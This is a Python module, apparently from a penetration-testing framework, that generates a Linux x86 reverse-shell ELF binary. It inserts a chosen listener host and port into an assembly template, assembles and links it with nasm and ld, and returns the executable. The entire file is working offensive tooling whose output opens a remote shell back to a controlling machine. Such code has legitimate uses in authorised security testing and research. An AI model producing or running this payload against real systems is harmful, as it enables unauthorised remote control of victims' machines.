#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

from lib.module import payload
from lib.module.payload import PayloadClass
from lib.module import safety
from lib.module import intrusiveness

import subprocess
import struct
import tempfile
import uuid
import os

class PayloadModule(PayloadClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Linux ELF x86 reverse shell',
            'Description': "Spawn a reverse shell with an x86 Linux ELF-file",
            'Options': ["LHOST", "LPORT"],
            'payload': {
                "type": payload.TYPE_SHELL,
                'arch': payload.ARCH_LINUX_X86,
            }
        })

    def payload_code(self, options):
        assert "LHOST" in options and "LPORT" in options

        # Need to get strings for lhost and lport in appropriate format
        lport = "0x" + struct.pack("<H", int(options["LPORT"])).hex()
        lhost = "0x"
        for octet in reversed(options["LHOST"].split(".")):
            a =  format(int(octet), "x").zfill(2)
            print(a)
            lhost += a

        print(lhost)
        # Read in original code
        with open("data/code/reverse_x86.asm", "r") as f:
            lines = f.readlines()

        # Replace code with lhost and lport we use
        data = ""
        for line in lines:
            if line.startswith("PORT equ"):
                line = "PORT equ {}\n".format(lport)
            elif line.startswith("HOST equ"):
                line = "HOST equ {}\n".format(lhost)
            data += line

        # Random file names which will be used
        tnames = []
        for i in range(0, 3):
            tnames.append(os.path.join("/tmp", str(uuid.uuid4())))

        # Write modified file back
        with open(tnames[0], "w") as f:
            f.write(data)

        # Compile the code
        subprocess.run("nasm -f elf32 {} -o {}".format(tnames[0], tnames[1]), shell=True, check=True)
        subprocess.run("/usr/bin/ld -m elf_i386 -o {} {}".format(tnames[2], tnames[1]), check=True, shell=True)

        # Read in ELF-file
        with open(tnames[2], "rb") as f:
            code = f.read()

        # Delete temporary files
        for tname in tnames:
            os.remove(tname)

        return code

